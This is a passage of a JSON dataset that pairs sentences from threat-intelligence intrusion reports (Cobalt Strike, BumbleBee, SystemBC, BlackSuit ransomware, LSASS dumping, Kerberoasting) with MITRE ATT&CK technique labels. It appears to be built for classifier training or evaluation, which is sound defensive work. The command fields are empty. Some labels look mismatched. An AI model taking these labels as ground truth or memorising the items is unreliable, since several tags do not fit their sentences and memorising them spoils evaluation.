    "text": "mstsc.exe is the child process of Cobalt Strike beacon RtWin64.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Output from Sharphound was stored in “C:\\Windows\\Temp\\Dogi\\”.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Based on the output files created, it looks like it was run in default mode as described below.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon eventID 11 showing the files created:",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Sharphound executed in memory by Cobalt Strike, performing LDAP queries:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor ran Sharphound on a domain controller for the first time.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The output from the first Sharphound run was saved to C:\\Windows\\System32\\.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The output from the second Sharphound run was saved to C:\\Perflogs\\.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon eventID 11 captured the files created by Sharphound.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "After gaining access to the second domain controller, the threat actor created files ADFind.exe and adf.bat to gather further Active Directory information.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon eventID 11 shows creation of ADFind.exe and adf.bat by Cobalt Strike.",
    "command": "",
    "labels": [
      "T1055",
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "A few seconds after creation of the files, the threat actor executed adf.bat to collect information.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This indicates the operator may have encountered difficulties, as the batch file was executed twice within just over a minute of the initial attempt, suggesting potential issues or missteps during execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon eventID 11 shows the creation of the files with the output of ADFind.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "It’s possible that the files ended up being empty, causing the threat actor to reconsider their approach.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "About 15 minutes later, the operator tried running ADFind.exe directly from the command line, likely to verify whether the tool would execute properly.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The operator likely made an error by trying to run adf.bat from C:\\Windows\\System32\\ when both adf.bat and ADFind.exe were actually located in C:\\Perflogs\\adf\\.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Because of this, ADFind.exe probably couldn’t be found as an executable in the wrong directory, leading to the error.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "After several days, the threat actor decided to give ADFind another try.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This time, on the file server the operator was successful in running adf.bat correctly to find ADFind.exe and perform the desired discovery activity.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon eventID 1 shows threat actor running adf.bat.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor also used a PowerShell script to enumerate local systems.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Interestingly, PowerShell was initiated using the start.bat file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "However, the start.bat file did not work as intended and passed the method parameter to the Get-DataInfo.ps1 script, which is not recognized as a valid parameter.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This behavior may have confused the operator at the keyboard, as well as the batch script that was run several times in a row on both servers.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon EventID 1 shows start.bat executes Get-DataInfo.ps1 with parameter method.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The start.bat script tries to set a variable called method to the discovery method chosen by the user if the method is not typed on the command line.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The issue with the script arises from the fact that the variable method does not receive the user-chosen value until after the IF condition is complete.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, the variable must be referenced as %method% to capture the user input correctly.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This oversight explains why the PowerShell command initiating Get-DataInfo.ps1 includes method as a parameter on the command line.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The default mode will run the Test-LHost, Get-DiskInfo and Get-Software functions in the script before calling the last function, Compress-Result.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon eventID 1 showing the execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon eventID 1 process create showing several runs of start.bat.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor performed several discovery commands using various Windows utilities at various times during the intrusion.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "First, Cobalt Strike utilized SMB ADMIN$ shares to move beacons laterally, along with distributing both SMB and HTTPS beacons.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In their pursuit of valuable data, the threat actor browsed through file systems, selectively opening files they deemed interesting.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Documents containing passwords, financial information, and other sensitive data were specifically targeted, as these types of files typically hold high value for the intruders.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon eventID 1 showing Notepad and Wordpad used to open and look at files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "For command and control, the threat actor used two main tools, Cobalt Strike and SystemBC.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Overview of Cobalt Strike traffic beaconing pattern over intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The initial Cobalt Strike beacon, delivered via RtWin64.exe on the beachhead host, maintained a continuous command and control domain at svchorst[.]com throughout the entire infection.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The IP address associated with the domain changed over time, and the communication process also shifted as queries were injected into different processes by RtWin64.exe.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "To further obfuscate its presence, the threat actor initially routed the Cobalt Strike command and control traffic through CloudFlare’s CDN service, effectively attempting to hide in plain sight by blending into legitimate web traffic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Later in the intrusion, the command and control (C2) server moved away from CloudFlare, and subsequently, the domain resolved to an AWS IP address.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Network connections to svchorst[.]com:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using Didier Steven’s great tool 1768.py, we successfully extracted the configuration of the Cobalt Strike beacon, which validated the host artifacts discovered on the beachhead host.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "In the rest of the infrastructure, two distinct types of Cobalt Strike beacons were deployed: HTTPS beacons and SMB beacons.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The HTTPS beacons appeared to communicate with three different domains—wq[.]regsvcast[.]com, as[.]regsvcast[.]com, and zx[.]regsvcast[.]com—though, in reality, only wq[.]regsvcast[.]com was actively used, resolving to IP address 147.78.47[.]178.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Since Cobalt Strike beacons can generate significant traffic, the volume of network connections for each beacon can be observed in the final column of these logs, highlighting the frequency and noisiness of the communication between beacons and command and control infrastructure.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Below is the configuration of the beacon from DC Y which communicated encrypted over https on port 443:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "One C2 connection from the Cobalt Strike beacons stands out from the rest: it originates from PowerShell but communicates over HTTP to port 80.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used PowerShell to perform the download:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Using Wireshark to view the exact HTTP query to the C2 server:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A PowerShell script was downloaded that decodes a Base64-encoded blob using `FromBase64String`.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This behavior is highly indicative of a Cobalt Strike PowerShell stager.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon decoding the Base64 blob, we uncovered another embedded PowerShell script.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After decoding the final base64 blob we get the Cobalt Strike beacon and can get the configuration (as the configuration is the same on all HTTP beacons the config is extracted with csce):",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Another command and control channel utilized by the threat actor in this intrusion was SystemBC, a tool frequently favored by ransomware groups.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor first brought in SystemBC as a file named SC.exe.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Security EventID 4624 showing RDP logon and Logon ID:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after the threat actor brought another SystemBC file, with the name socks32.exe.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "That was moved to the file server from DC X.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "socks32.exe moved over SMB C$ share:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once again execution is done manually after logging in through RDP.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "If the SystemBC sample is compiled without modifications, it should be feasible to extract the configuration from the implant by examining the exe file, as all information is presented in plain text.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "They introduced an executable named qwe.exe, which we later identified as BlackSuit ransomware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Instead, to ensure accuracy and eliminate the risk of typos, they also moved a file named 123.txt along with qwe.exe, likely using it as a script or reference to guarantee the correct execution of the ransomware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Windows security eventID 5145 shows distribution of 123.exe to the c:\\users directory:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Movement of the 123.txt file seen from the network side.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After staging the ransomware executable qwe.exe and the helper file 123.txt, the threat actor used RDP from DC X to log onto various systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory.",
    "command": "",
    "labels": [
      "T1106",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "When the user double clicks or opens the lnk file, they inadvertently start a hidden file, a DLL (namr.dll) containing the Bumblebee malware loader.",
    "command": "",
    "labels": [
      "T1106",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "From there, the loader reached out to the Bumblebee C2 servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.",
    "command": "",
    "labels": [
      "T1055",
      "T1057",
      "T1059.003",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Four hours after initial access, the threat actor used RDP to access a server using the local Administrator account.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then deployed AnyDesk, which was the only observed persistence mechanism used during the intrusion.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the ProgramData folders on multiple hosts in the environment.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "They then used remote services to execute Procdump, which was used to dump LSASS.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "At this point, the actors appeared to be searching for more access then they currently had.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "While they were able to move laterally to workstations and at least one server, it seemed that they had not yet taken control of an account that provided them the access they were seeking, likely a Domain Admin or similarly highly privileged account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Again, they executed VulnRecon and then also executed Seatbelt, a red team tool for preforming various host based discovery.",
    "command": "",
    "labels": [
      "T1012",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After injecting into various processes, the threat actors executed the PowerShell module Invoke-Kerberoast.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "After the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The initial payload named BC_invoice_Report_CORP_46.iso, is an ISO image that once mounted, lures the user to open a document.lnk file which will execute the malicious DLL loader using the following command line:",
    "command": "",
    "labels": [
      "T1059.003",
      "T1204.002",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The successful execution of BumbleBee payload (namr.dll) resulted in the dropping and the execution of several payloads using multiple techniques.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The graph below shows all the payloads dropped by BumbleBee, the way they were executed, and the different processes they injected into:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon File Created event showing wab.exe created by rundll32.exe",
    "command": "",
    "labels": [
      "T1105",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon Event Code 1 showing wab.exe executed by WMI",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The following PowerShell one-liner was executed from wab.exe during day 11, which downloaded obfuscated PowerShell and executed it in memory:",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The command and control server was hosted on (108.62.12[.]174/dofixifa[.]co).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The full config extraction, detailing the Malleable C2 profile, is available in Command and Control section.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "AnyDesk and its installation as a service was used in order to persist and create a backdoor to the network.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors made a mistake by launching the getsystem command in the wrong console (shell console rather than the beacon console).",
    "command": "",
    "labels": [
      "T1055",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The parent process of this command was C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc , a process where Cobalt Strike was injected into:",
    "command": "",
    "labels": [
      "T1053.005",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This command is a built-in Cobalt Strike command that is used to get SYSTEM privileges.",
    "command": "",
    "labels": [
      "T1055",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Valid Accounts",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors obtained and abused credentials of privilege domain accounts as a means of gaining privilege escalation on the domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "They also utilized local administrator accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "A service account, with Domain Admin permissions, was used to create a remote service on a Domain Controller to move laterally.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Process Injection",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The process injection technique was used multiple times to inject into different processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Almost every post-exploitation job was launched from an injected process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Right after its execution, the wab.exe process created two remote threads in order to inject code into explorer.exe and rundll32.exe:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors also created a remote thread in svchost.exe:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A Yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various injections across hosts.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Indicator Removal on Host: File Deletion",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The table below shows an example of ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process:",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc beacon:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The ProcDump utility was executed on those workstations using the following command line:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Around 3 hours later, one of the service accounts logged into one of the Domain Controllers from the beachhead.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "System Information & Software Discovery",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Using the same beacon, wab.exe, tasklist was also used in order to enumerate processes on multiple hosts remotely:",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Because rundll32.exe executed PowerShell, we can see that rundll32.exe created the ShareFinder.txt output file in C:\\ProgramData\\.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The tool SeatBelt was used by the threat actors on a server in order to discover potential security misconfigurations.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Seatbelt is a C# project that performs a number of security oriented host-survey “safety checks” relevant from both offensive and defensive security perspectives.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors performed a full reconnaissance by specifying the flag -group=all:",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server:",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account:",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This first lateral movement was performed in order to drop and install AnyDesk.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The account used to perform this lateral movement was one of the kerberoasted service accounts.",
    "command": "",
    "labels": [
      "T1078",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The service runs a rundll32.exe process without any arguments.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This process was beaconing to (108.62.12[.]174/dofixifa[.]co), the second Cobalt Strike C2, used during the last day of this intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We observed this beacon performing various techniques (process injections in svchost process via CreateRemoteThread, default named pipes, etc.)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The graph below shows all communications to malicious IP addresses made by the dropped payloads or processes which threat actors injected into:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "All the active Bumblebee command and control shared a common server configuration in regards to TLS setup.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Two CS C2 servers were used during this intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The graph below shows beaconing activity over time, we can notice the continuous usage of the first C2 server (45.153.243[.]142/fuvataren[.]com) from day 1 and the second C2 server (108.62.12[.]174/dofixifa[.]co) during the last day of intrusion only (day 11):",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The main beacon wab.exe:  45.153.243[.]142,fuvataren[.]com",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Below is the Cobalt Strike configuration of this C2 exported from a sandbox analysis results:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Full configuration extraction using 1768.py tool:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used default CS configuration and default named pipes.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As mentioned before in the lateral tool transfer section, threat actors remotely dropped the AnyDesk binary on a server from the beachhead:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A new service was created (Event ID 7045) upon the execution of AnyDesk installer:",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "AnyDesk logs, %ProgramData%\\AnyDesk\\ad_svc.trace and %AppData%\\AnyDesk\\ad.trace, show that it was used during Day 1 and Day 7 of this intrusion, using the local Administrator account each time.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The intrusion began with the delivery of an ISO file that contained an LNK and a DLL.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "They then performed reconnaissance, used two different UAC bypass techniques, dumped credentials, escalated privileges using a ZeroLogon exploit, and moved laterally through the environment.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "A zip file is then downloaded to the victim machine and once unzipped the user is presented with an ISO file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The ISO contains a LNK file and a DLL file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "When the LNK is double-clicked, the BumbleBee DLL is executed via rundll32.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Initially, contact was made with BumbleBee command and control servers but little other early activity was observed.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Approximately 12 hours later, ImagingDevices.exe was launched via WmiPrivse.exe and a Meterpreter agent was injected into the process, like we have observed in previous reports.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This process then utilized nltest, net, tasklist, and whoami to perform reconnaissance.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "About 37 minutes after launching ImagingDevices.exe, the Meterpreter agent migrated to svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Now in the SYSTEM context, this Meterpreter agent executed a Cobalt Strike Beacon DLL.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "AdFind, nltest, net, and systeminfo were used to facilitate this activity.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The Sysinternals tool ProcDump64 was written to disk and used to dump lsass on the beachhead host.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "These were executed via remote services, but appeared to be there for redundant connections as the threat actors continued to perform their actions on the beachhead workstation.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After successfully exploiting the Domain controller, the threat actors used Pass the Hash to begin working in the context of a user who was a member of the Domain Admins group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "From the beachhead host, Invoke-Sharefinder was executed with the output being written to disk.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "A Cobalt Strike Beacon DLL was then written over SMB to another Domain Controller and executed via a service.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Next, a zip file is downloaded to the victim’s system, which when unzipped reveals the ISO image file StolenImages_Evidence.iso, once mounted–lures the victim to open a shortcut mimicking a fake documents folder:",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The LNK was pointing to the following command, which runs a malicious DLL when the user double clicks on the LNK file:",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "By extracting LNK metadata using Eric Zimmerman’s LECmd tool, we noticed that the initial BumbleBee payload was generated by the same threat actors reported in our previous BumbleBee report:",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors dropped and executed multiple payloads reaching out to different C2s.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The graph below shows how the threat actors were able to pivot between C2s by either injecting into legitimate processes or dropping and executing new payloads.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Like in our previous BumbleBee report, we see the use of injection into a legitimate Windows executable.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "And likewise, we see BumbleBee spawning these new processes using WmiPrvSE.exe.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The graphic below shows all payloads dropped, executed, or injected by the threat actors.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
